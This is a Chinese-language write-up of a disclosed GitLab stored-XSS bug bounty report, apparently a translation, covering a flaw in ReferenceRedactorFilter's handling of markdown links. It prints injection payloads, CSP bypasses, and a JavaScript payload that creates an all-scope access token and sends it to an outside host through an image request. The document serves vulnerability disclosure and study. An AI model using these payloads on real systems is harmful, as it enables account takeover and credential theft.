
https://gitlab.com/gitlab-org/gitlab/-/issues/213273

gitlab漏洞系列-存在于markdown中的存储型XSS

声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。


## 背景

vakzz大佬于2020年提交了这个漏洞:

可以通过`ReferenceRedactorFilter`将任意html注入到标记中。这是因为data-original属性允许存储html编码的数据，然后将其提取并用作链接内容。如果原始数据已经被html编码，那么它将在编校后被未编码:
```ruby
    def redacted_node_content(node)  
      original_content = node.attr('data-original')  
      link_reference = node.attr('data-link-reference')

      # Build the raw <a> tag just with a link as href and content if  
      # it's originally a link pattern. We shouldn't return a plain text href.  
      original_link =  
        if link_reference == 'true'  
          href = node.attr('href')  
          content = original_content

          %(<a href="#{href}">#{content}</a>)  
        end

      # The reference should be replaced by the original link's content,  
      # which is not always the same as the rendered one.  
      original_link || original_content || node.inner_html  
    end  
```

## 复现步骤
1.用一个账户创建一个私有项目;

2.在这个私有项目中创建一个issue;

3.登出,然后重新以另外一个账户登录,此账户没有权限查看上面那个私有项目;

4.使用以下链接对与私人issue相关的issue发表评论:
```
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a> 
```
5.渲染的markdown包含了注入的html:
```
<div class="md"><p data-sourcepos="1:1-1:124" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">xss <img onerror="alert(1)" src="x"></a></p></div> 
```

6.上面的代码被csp机制阻止了，但是可以像`https://hackerone.com/reports/662287#activity-6026826`(主要逻辑就是创建了一个类为`class='atwho-view select2-drop-mask pika-select' `的图像)一样绕过(需要点击页面上的任何地方，但是链接是全屏的):
```
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">csp   
&lt;a   
  data-remote=&quot;true&quot;  
  data-method=&quot;get&quot;  
  data-type=&quot;script&quot;  
  href=/wbowling/wiki/raw/master/test.js  
  class='atwho-view select2-drop-mask pika-select'  
&gt;  
  &lt;img height=10000 width=10000&gt;  
&lt;/a&gt;  
</a>  
```
产生了以下html:
```
<div class="md issue-realtime-trigger-pulse"><p data-sourcepos="1:1-11:4" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">csp  
</a><a data-remote="true" data-method="get" data-type="script" href="/wbowling/wiki/raw/master/test.js" class="atwho-view select2-drop-mask pika-select">  
<img height="10000" width="10000">  
</a>  
</p></div>  
```
## 影响
在ReferenceRedactor运行的任何地方，都可以注入任意的html。用户可以设置自己的私人项目，然后在公共项目上发表评论或问题，链接到该项目并注入xss


## 绕过csp示例
这里并不需要与用户交互
https://gitlab.com/username/project-name/-/issues/1
```
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">csp &lt;script src=&quot;/username/public/-/raw/master/test.js&quot;&gt;&lt;/script&gt; </a>
```
如果你通过git lfs(大文件存储,具体可以参考https://docs.github.com/en/repositories/working-with-files/managing-large-files/installing-git-large-file-storage)添加了一个javascript文件，那么它将会以 `content-type`为application/javascript结束，并且可以作为一个脚本src使用，因为在csp中`script-src 'self'`。
```
$ curl -I 'https://gitlab.com/vakzz-h1/public/-/raw/master/test.js'
HTTP/2 200
date: Thu, 02 Apr 2020 03:39:57 GMT
content-type: application/javascript
...
```
还有一个例子用来展示影响，如果你点击ok，它会创建一个个人令牌(注意是包含所有范围的令牌,注:gitlab里面的scopes指的是类似读，写仓库之类的权限,就是说拿到这个令牌,你可以对某个仓库进行读写操作,我这里只说大致的逻辑，方便读者理解)，并发送到远程服务器。xss可以隐藏在一个问题或评论中，并且可以触发任何查看页面的人。
issue的链接为:
`https://gitlab.com/vakzz-h1/stored-xss/-/issues/4`
填写在这个issue里面的code为:
```
<a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">create and leak an access token 
&lt;script src=&quot;/vakzz-h1/public/-/raw/master/payload.js&quot;&gt;&lt;/script&gt;
</a>
```
payload.js为:
```JavaScript
async function getToken() {
const formData = new FormData();

formData.append(
document.querySelector('meta[name="csrf-param"]').content,
document.querySelector('meta[name="csrf-token"]').content
);
formData.append("personal_access_token[name]", "test");
formData.append("personal_access_token[scopes][]", "api");
formData.append("personal_access_token[scopes][]", "read_user");
formData.append("personal_access_token[scopes][]", "read_repository");
formData.append("personal_access_token[scopes][]", "write_repository");
formData.append("personal_access_token[scopes][]", "read_registry");

const response = await fetch(
"https://gitlab.com/profile/personal_access_tokens",
{
credentials: "include",
body: formData,
method: "POST",
mode: "cors"
}
);

const parser = new DOMParser();
const doc = parser.parseFromString(await response.text(), "text/html");
return doc.querySelector("#created-personal-access-token").value;
}

if (confirm("Create an access token?")) {
getToken().then(token => {
alert("Created token is: " + token);
const image = new Image();
image.src = `//aw.rs/g/leak.gif?token=${token}`;
});
}


```


## 后续
这个漏洞官方给了5000美元




